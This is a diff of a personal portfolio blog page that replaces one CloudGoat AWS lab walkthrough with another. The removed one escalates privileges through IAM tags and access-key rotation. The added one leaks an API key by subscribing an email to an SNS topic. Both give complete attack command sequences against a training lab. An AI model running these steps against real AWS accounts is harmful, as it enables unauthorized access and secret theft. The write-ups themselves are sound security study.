@@ -2,74 +2,93 @@
 <html lang="en">
 
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
-<link rel="manifest" href="../../favicon/site.webmanifest">
-<link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5">
+    <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png" />
+  <link rel="manifest" href="../../favicon/site.webmanifest" />
+  <link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5" />
 
+  
+  <meta name="msapplication-TileColor" content="#da532c" />
+  <meta name="theme-color" content="#ffffff" />
 
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
-/>
-
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css"
-/>
-
-<link rel="stylesheet" href="../../css/custom-swiper.css">
-
-
-
-
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="theme-color" content="#ffffff">
-<title itemprop="name"> Cloudgoat IAM Privesc By Key Rotation | Personal Portfolio 
+  
+  <title itemprop="name"> Cloudgoat SNS Secrets | Personal Portfolio 
 </title>
 <meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
-<meta property="og:title" content="Cloudgoat IAM Privesc By Key Rotation | Personal Portfolio" />
-<meta name="twitter:title" content="Cloudgoat IAM Privesc By Key Rotation | Personal Portfolio" />
-<meta itemprop="name" content="Cloudgoat IAM Privesc By Key Rotation | Personal Portfolio" />
-<meta name="application-name" content="Cloudgoat IAM Privesc By Key Rotation | Personal Portfolio" />
+<meta property="og:title" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta name="twitter:title" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta itemprop="name" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta name="application-name" content="Cloudgoat SNS Secrets | Personal Portfolio" />
 <meta property="og:description"
       content="A biomedical engineering student and cybersecurity enthusiast" />
 <meta property="og:site_name" content="Personal Portfolio" />
 <meta property="og:url" content="http://localhost:1313/posts/snssecrets_cloudgoat-walkthrough-copy/" />
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo.png" />
-<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo.png" />
+<meta property="og:image" content="/assets/images/posts/snsSecrets_cloudgoat_challenge_logo.png" />
+<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/snsSecrets_cloudgoat_challenge_logo.png" />
 <meta property="og:type" content="article" />
 
-<script>
-    
-    if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-        document.documentElement.classList.add('dark');
+
+  
+  <script>
+    if (
+      localStorage.getItem('color-theme') === 'dark' ||
+      (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
+    ) {
+      document.documentElement.classList.add('dark');
     } else {
-        document.documentElement.classList.remove('dark')
+      document.documentElement.classList.remove('dark');
     }
-</script>
+  </script>
 
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css" />
 
+  
+  
+  
+    
+    <link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+  
 
-
-<link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+  
+  <link rel="stylesheet" href="../../css/custom-swiper.css" />
+</head>
 
 </head>
 
 <body class="bg-zinc-100 dark:bg-gray-800">
-    <div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10">
+    <div class="top-0 z-50 w-full text-gray-700 bg-gray-300 border-b border-gray-300 dark:text-gray-300 dark:bg-gray-900 dark:border-gray-700 md:sticky">
     <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
         <div class="flex flex-row items-center justify-between p-4">
-            <a href="../../" class="flex text-gray-100 transition duration-1000 ease-in-out group">
-                <img src="../../images/cyber-immuno-fusion.png" class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Personal Portfolio Logo" />
-                <div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 uppercase transition-colors group-hover:text-gray-400/60">
-                    Personal Portfolio</div>
+            <a href="../../"
+            class="flex
+                    text-gray-700 dark:text-gray-300
+                    transition-colors
+                    hover:text-gray-900 dark:hover:text-white"
+            >
+            <img
+                src="../../images/cyber-immuno-fusion.png"
+                class="transition-opacity h-9 w-9
+                    hover:opacity-50 focus:opacity-70"
+                alt="Personal Portfolio Logo"
+            />
+            <div
+                class="mt-1 ml-3 text-xl font-black tracking-tight
+                    text-gray-700 dark:text-gray-300 uppercase
+                    transition-colors
+                    hover:text-gray-400 dark:hover:text-white"
+            >
+                Personal Portfolio
+            </div>
             </a>
             <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
                 <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
@@ -93,14 +112,20 @@
             
             
             
-            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
-                Cybersecurity
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/biomedical/" title="Biomedical">
+                Biomedical
             </a>
             
             
             
-            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/posts/" title="Walkthroughs">
-                Walkthroughs
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/software/" title="Software">
+                Software
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
+                Cybersecurity
             </a>
             
             
@@ -123,7 +148,7 @@
   <header class="mb-4 bg-primary-600">
     <span class="py-96">
       <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
-        Cloudgoat IAM Privesc By Key Rotation
+        Cloudgoat SNS Secrets
       </h1>
     </span>
   </header>
@@ -135,7 +160,7 @@
       
       
       
-      <img src="../../../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo_hu_defeb6057c567aa7.webp" srcset=", /../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo_hu_70636967e0b1e494.webp 400w, /../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo_hu_5a0aeea0bd49a58c.webp 550w, /../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo_hu_c3fd149b5594575f.webp 768w, /../assets/images/posts/iam_privesc_by_key_rotation_cloudgoat_challenge_logo_hu_defeb6057c567aa7.webp 1100w"
+      <img src="../../../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_93f6ef5a9272d91a.webp" srcset=", /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_7429a7b34ee49fa4.webp 400w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_3c9f49f5aa198b5f.webp 550w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_d893834d48f1127a.webp 768w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_93f6ef5a9272d91a.webp 1100w"
            class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
            width="100%" alt="" />
       
@@ -145,174 +170,173 @@
   
   <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
     <h1 id="introduction--context">Introduction &amp; Context</h1>
-<p>Hey guys! This is a write-up for the iam_privesc_by_key_rotation challenge from Cloudgoat that you can find <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md">here</a>. The lab focuses on doing some enumeration to find some poorly designed security mechanisms usings tags. Utilizing the misconfiguration you can become admin and then set up MFA to gain access to the final role and grab the flag. I&rsquo;ll walk through how I did it, including any rabbit holes (I&rsquo;ll point them out) I went down. I&rsquo;ll provide all commands needed from start to end, so follow along!</p>
+<p>Hey guys, this is a write-up for the sns_secrets challenge from Cloudgoat, available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sns_secrets/README.md">here</a>. The lab will give you credentials to do some basic enumeration on SNS &amp; the API Gateway but not much more than that. This is the second and final capstone challenge from Tyler&rsquo;s <a href="https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting">Intro to AWS Pentesting course</a>. As a capstone challenge it was unguided and I had to run through it myself. I&rsquo;ll walk through how I did it (mostly manually) but also point out how you could run it through pacu if you want. I&rsquo;ll be giving some of my thoughts and the commands I ran through this lab. Now onto the lab!</p>
 <h1 id="setup">Setup</h1>
-<p>If you haven&rsquo;t booted the cloudgoat, run <code>cloudgoat create iam_privesc_by_key_rotation</code>. This one loaded in underr a minute and it will give you a pair of credentials. Add them using <code>aws configure --profile iam_key_rotation</code> (region can be us-east-1 and format as json). Then make sure they actually work by running <code>aws sts get-caller-identity --profile iam_key_rotation</code>. Now let&rsquo;s go!</p>
-<h1 id="enumerate-environment-using-pacu">Enumerate environment using pacu</h1>
-<p>I&rsquo;m going to be using <a href="https://github.com/RhinoSecurityLabs/pacu">pacu</a> to do some of the initial enumeration. Run <code>pacu</code> to get the session running and then <code>import_keys iam_key_rotation</code> to connect the initial credentials. The two commands to have our inital look around are <code>run iam__enum_permissions</code> and <code>run iam__enum_users_roles_policies_groups</code>. Those two will give a solid view of the permissions we have any any interesting iam objects lying around.</p>
-<p>Now to see what we can do, just run <code>whoami</code>. We have a lot of permission. The thing that caught my eye was this one that would allow us to create and delete access keys if the tag was <code>developer</code>. Interesting. If we check the users list we see that there is a developer user that exists. You can check that using <code>data iam Users</code> (running <code>data iam</code> will give all iam info which may be a bit much).</p>
-<h2 id="become-the-developer">Become the developer</h2>
-<p>So this is the rabbit hole I went down. I thought maybe this developer has some elevated permissions and ran <code>aws iam list-user-policies --profile iam_key_rotation --user-name developer_cgidiirfl3bvbv</code> to see what policies he had. And he had one called &lsquo;DeveloperViewSecrets&rsquo;! Maybe an easy win? But if you check the permissions of that using <code>aws iam get-user-policy --profile iam_key_rotation --user-name developer_cgidiirfl3bvbv --policy-name DeveloperViewSecrets</code> you&rsquo;ll see that he can only list the secrests, not view them.</p>
-<p>I ended up trying anyways to see if maybe he has some other permissions, but nope. He&rsquo;s a dead end. You can of course create an access key for him and take on that user, but all he can do is just tell you that a secret exists.</p>
-<h1 id="tag-the-admin">Tag the Admin!</h1>
-<p>So since the developer didn&rsquo;t work, there was one other role left (excluding the cloudgoat one ofc). The admin user. If we looked carefully through the <code>whoami</code> command results we ran earlier, you&rsquo;ll notice a few critical permissions:</p>
+<p>If you haven&rsquo;t started cloudgoat yet, you can start with <code>cloudgoat create sns_secrets</code>. Shouldn&rsquo;t take too long to boot up. Once it&rsquo;s set, add the credentials using <code>aws configure --profile sns_low</code>. I set the region to <code>us-east-1</code> and the format as <code>json</code>.</p>
+<p>Of course, we need to validate the keys before using them. Run <code>aws sts get-caller-identity --profile sns_low</code>. It should work as that. So let&rsquo;s start!</p>
+<h1 id="enumerating-users">Enumerating users</h1>
+<p>So for this part I&rsquo;m going to use pacu and hope it works. I&rsquo;ll try enumerating the sns user first. Get it running using these commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu 
+</span></span><span style="display:flex;"><span>import_keys sns_low
+</span></span><span style="display:flex;"><span>ran iam__enum_permissions
+</span></span></code></pre></div><p>Once that runs (and thankfully it does), run <code>whoami</code> in the pacu interface to see what we got. Under permissions you&rsquo;ll see we have the following:</p>
 <ul>
-<li>iam:createaccesskey</li>
-<li>iam:deleteaccesskey</li>
+<li><em>sns:listtopics</em></li>
+<li><em>sns:listsubscriptionsbytopic</em></li>
+<li><em>sns:gettopicattributes</em></li>
+<li>iam:getuserpolicy</li>
+<li>iam:getattacheduserpolicies</li>
+<li>iam:listuserpolicies</li>
+<li>iam:listgroupsforuser</li>
+<li><em>sns:subscribe</em></li>
+<li>apigateway:get</li>
+<li><em>sns:receive</em></li>
 </ul>
-<p>However, those could be only done on the developer, or so they thought&hellip; The issue here was that we also had the permission &lsquo;iam:taguser&rsquo;. That meant, we could add a tag to any user, and then do all the things we used to be only do to the developer. So let&rsquo;s do that</p>
-<p>First up, add the tag using <code>aws iam tag-user --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --tags Key=developer,Value=true</code></p>
-<h2 id="escalate">Escalate</h2>
-<p>Now we can edit the admin user. First you can try to create a key using <code>aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv</code>. But that&rsquo;ll fail. The admin already has 2 keys and we can&rsquo;t add more.</p>
-<p>But we also had permission to delete keys, so let&rsquo;s list the keys they have and just delete one. List them using <code>aws iam list-access-keys --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv</code> and delete using <code>aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --access-key-id AKIAVRUVQNVQWOME4UIF</code>.</p>
-<p>Run the same command to create a key as before and record the results. Configure a new profile using <code>aws configure --proflile admin</code> and run a quick check using <code>aws sts get-caller-identity --profile admin</code>. You should be in!</p>
-<h1 id="take-on-the-secret-role">Take on the secret role</h1>
-<p>Now that you&rsquo;re admin, you can try to grab the secret. But no. Any attempt will fail because even the admin can not view secrests. But you know who can? The secret manager role. If we go back to pacu and check <code>data iam Roles</code>, you&rsquo;ll see a secret manager role whose description states they can view secrets.</p>
-<p>So let&rsquo;s try and take on that role! Run <code>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidiirfl3bvbv --role-session-name magic --profile admin</code>. But&hellip; again we are stopped (temporarily). We don&rsquo;t have the permission to do that. If you noticed earlier the role had a little something saying <code>aws:MultiFactorAuthPresent</code>. We can&rsquo;t bypass MFA&hellip;</p>
-<h2 id="bypass-mfa">Bypass MFA</h2>
-<p>Okay, so for this I had to ask Chat the commands that will allow us to bypass. A keen eye would have noticed during the <code>whoami</code> command on the initial user, we had lots of permissions about the mfa that could be applied to the developer role. Well admin has that role. So we&rsquo;re going to use his profile to add mfa to ours!</p>
-<p>First, we create a virtual MFA device using <code>aws iam create-virtual-mfa-device --virtual-mfa-device-name admin-virt-mfa --outfile mfa-qr.png --profile iam_key_rotation --bootstrap-method QRCodePNG</code>. That will save a png of a QR code to your working directory.</p>
-<p>Open up your phone and use an authenticator app to scan that QR. It should set up pretty quickly. Once done, you&rsquo;ll need to grab two consecutive codes from it. Once you have them replace them here</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam enable-mfa-device --user-name admin_cgidf88xs8i2ur --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --authentication-code1 CODE1GOESHERE --authentication-code2 CODE2GOESHERE --profile iam_key_rotation
-</span></span></code></pre></div><p>That will set up our mfa!</p>
-<h1 id="access-the-secret-role">Access the secret role</h1>
-<p>We&rsquo;ll need to do a refresh of our keys according to chat, so delete one of the access keys using the same command as earlier (diffferent key though), <code>aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur --access-key-id AKIAVRUVQNVQ3RMHLPPL</code>.</p>
-<p>Make a new key using <code>aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur</code>.</p>
-<p>And assume a role (make sure to put a valid token) using <code>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidf88xs8i2ur --role-session-name magic --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --token-code VALIDTOKENHERE --profile admin</code></p>
-<p>And you&rsquo;ll have the final set of credentials!</p>
-<h1 id="grab-the-secret">Grab the secret</h1>
-<p>Configure the role using <code>aws configure --profile iam_key_role</code> and pass in the new values. You&rsquo;ll need to pass in the session token manually using <code>aws configure set profile.iam_key_role.aws_session_token TOKENGOESHERE</code>. Once you&rsquo;re in, you can use <code>aws sts get-caller-identity --profile iam_key_role</code> to verify your in. And boom!</p>
-<p>Now, I checked the <a href="https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-secret-value.html">documentation</a> for the precise command to find the secret. First list the secrests there using <code>aws secretsmanager list-secrets --profile iam_key_role</code>.</p>
-<p>Then grab the flag using: <code>aws secretsmanager get-secret-value --profile iam_key_role --secret-id arn:aws:secretsmanager:us-east-1:381491899745:cg_secret_cgidf88xs8i2ur-jghZnP</code>!</p>
+<p>You&rsquo;ll notice that we&rsquo;re also denied a few things about api-gateway, but we can burn that bridge when we get to it. But here&rsquo;s the key part. The first few sns permissions seem to be related to enumeration while the last couple are about using the system. Those will probably be useful.</p>
+<h1 id="simple-notification-servicesns">Simple Notification Service(SNS)</h1>
+<h2 id="what-is-it-cli-commands">What is it? CLI Commands?</h2>
+<p>Before we go into SNS we should learn what it is. SNS is amazon&rsquo;s simple notification service. According to <a href="https://aws.amazon.com/sns/">this site</a>, it&rsquo;s a &ldquo;fully managed Pub/Sub service for A2A and A2P messaging&rdquo;. That basically means it&rsquo;s used for sending notifications to people or other applications. It can be used to send SMS, emails and mobile push notifications too. One of the use cases is &ldquo;securely encrypt notification message delivery&rdquo;. We&rsquo;ll see how secure this SNS configuration is&hellip; If you&rsquo;re curious to learn more, just google it, lots of youtube videos pop up that can explain it way better than I can in a blog post.</p>
+<p>So now that I&rsquo;ve done a few AWS labs through cloudgoat and seen the json policies for them, I&rsquo;ve noticed a pattern in them. When I have a permission like <code>iam:getuserpolicy</code>, the execution is typically like <code>aws sns get-user-policy --MoreFlags</code>. So taking a wild guess, we&rsquo;re just gonna play around and execute some commands.</p>
+<h2 id="enumerate">Enumerate</h2>
+<p>We&rsquo;re given 3 for enumerating and 2 for using it I think. The second and third say list or get by topic. So we&rsquo;ll need to figure out what the topics are and it seems the first command can do that. A topic by the way is an access point or communciation channel that is used to send messages, according to <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-create-topic.html">this site</a>. So run <code>aws sns list-topics --profile sns_low</code> and you&rsquo;ll receive a response giving you a topic arn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Topics&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;TopicArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So now we can try to see if we can pull anything else off that. Try running <code>aws sns list-subscription-by-topic --profile sns_low</code>. That won&rsquo;t work and it says you&rsquo;ll need to add the topic arn as a flag.</p>
+<p>So that&rsquo;s the flag we&rsquo;re going to use for the next couple commands (of course use your own topic):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low  
+</span></span></code></pre></div><p>It seems there are no subscribers to it yet. But it does seem to have a policy to send stuff if we look at the <code>EffectiveDeliveryPolicy</code> output from the second command.</p>
+<p>So pull up the <a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">documentation</a> and you&rsquo;ll see we can subscribe by email. So let&rsquo;s give that a shot. I had to ask chatgpt the full command for this once I understood it was, but here you go:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint YOUR_EMAIL_HERE
+</span></span></code></pre></div><p>I thought we might need to force a receive too, but what do you know. A minute later I get a confirmation email and then a minute later I get another email. And that email had the DEBUG: API GATEWAY KEY!</p>
+<h2 id="an-automated-approach">An automated approach?</h2>
+<p>I did this manually but you can also do this by using pacu. If you open pacu using <code>pacu</code>, then <code>import_keys sns_low</code> there&rsquo;s only 2 commands you need to run to get those emails sent to you.</p>
+<ol>
+<li><code>run sns__enum --region us-east-1</code></li>
+<li><code>data iam</code> Grab the topic arn from it</li>
+<li><code>run sns__subscribe --topics TOPICARN --email EMAIL</code></li>
+</ol>
+<h1 id="api-gateway">API Gateway</h1>
+<h2 id="what-is-it">What is it?</h2>
+<p>Again, before we go into enumerating this service we should understand what it actually does. According to <a href="https://aws.amazon.com/api-gateway/">this site</a>, it&rsquo;s a service that allows developers to make &ldquo;secure&rdquo; APIs at scale. An API is really just an access point for users or applications to interact with something, whether that&rsquo;s a website or a server or something else entirely. But it&rsquo;s only as secure as you make it. So if you have an SNS system that leaks an API key&hellip; Well, maybe it&rsquo;s not so secure.</p>
+<h1 id="finding-the-api">Finding the API</h1>
+<p>I had to ask ChatGPT for some of the commands here. I&rsquo;ll make a note though, don&rsquo;t just blindly copy paste the commands it gives you. It does make assumptions (like it assumed the stage was <code>prod</code> and led me on a wild goose chase). Actually take the time to understand the command syntax and what it&rsquo;s giving you before going on.</p>
+<p>The first command is to find out what api&rsquo;s are by running <code>aws apigateway get-rest-apis --profile sns_low</code>. The key part is the id (first thing in the response). Mine was: <code>&quot;id&quot;: &quot;696zi4tra7&quot;</code>.</p>
+<p>Now ChatGPT said to grab teh resources using <code>aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low</code>. Under the items section, you&rsquo;ll notice the path is <code>/user-data</code>. Note that down.</p>
+<p>And finally we need to grab the actual stage name using <code>aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low</code>. Under the stageName you&rsquo;ll see something like <code>prod-cgidth6ftmf8pq</code>. And that&rsquo;s all the information we need.</p>
+<h2 id="call-the-api">Call the Api</h2>
+<p>To construct the link we&rsquo;re going to target, use this format:</p>
+<p><a href="https://ID.execute-api.us-east-1.amazonaws.com/STAGENAME/PATH">https://ID.execute-api.us-east-1.amazonaws.com/STAGENAME/PATH</a></p>
+<p>Mine was <code>https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data</code>. Yours should be similar.</p>
+<p>Now we can call it by passing in the api key using curl: <code>curl -v -H &quot;x-api-key: 45a3da610dc64703b10e273a4db135bf&quot; https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data</code></p>
+<p>And you&rsquo;ll get your flag!</p>
 <h1 id="conclusion">Conclusion</h1>
-<p>This was a one of the longer labs i&rsquo;ve done on cloudgoat. We had to enumerate our environment well and find the misconfigured IAM policies about tags. We had to apply tags, delete and make new keys (even use MFA!) to finally get access to the secret role to grab our flag. A fun lab highlighting the improtance of configuring IAM policies properly.</p>
+<p>This was an interesting lab where I had to use a lot of the documentation and playing around to get the right commands. We started by enumerating SNS and subscribing ourself to a topic. Using that we found an API key which we could then use the look into the Api gateway and grab our flag.</p>
 <p><em>Don&rsquo;t forget to destroy your lab after!</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy iam_privesc_by_key_rotation
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy sns_secrets
 </span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
 <p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
-</span></span><span style="display:flex;"><span>cloudgoat create iam_privesc_by_key_rotation
-</span></span><span style="display:flex;"><span>aws configure --profile iam_key_rotation
+</span></span><span style="display:flex;"><span>cloudgoat create sns_secrets
+</span></span><span style="display:flex;"><span>aws configure --profile sns_low
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Pacu our permissions</span>
 </span></span><span style="display:flex;"><span>pacu
 </span></span><span style="display:flex;"><span>import_keys sns_low
 </span></span><span style="display:flex;"><span>run iam__enum_permissions
-</span></span><span style="display:flex;"><span>run iam__enum_users_roles_policies_groups
 </span></span><span style="display:flex;"><span>whoami
-</span></span><span style="display:flex;"><span>data iam Users
-</span></span><span style="display:flex;"><span>data iam Roles
 </span></span><span style="display:flex;"><span>exit
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Tag the Admin &amp; Escalate!</span>
-</span></span><span style="display:flex;"><span>aws iam tag-user --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --tags Key<span style="color:#f92672">=</span>developer,Value<span style="color:#f92672">=</span>true
-</span></span><span style="display:flex;"><span>aws iam list-access-keys --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv  
-</span></span><span style="display:flex;"><span>aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv --access-key-id AKIAVRUVQNVQWOME4UIF
-</span></span><span style="display:flex;"><span>aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidiirfl3bvbv 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate SNS</span>
+</span></span><span style="display:flex;"><span>aws sns list-topics --profile sns_low
+</span></span><span style="display:flex;"><span>aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low
+</span></span><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low   
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Become admin</span>
-</span></span><span style="display:flex;"><span>aws configure --profile admin
-</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile admin
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Subscribe </span>
+</span></span><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint unrealperson50@gmail.com
 </span></span><span style="display:flex;"><span>
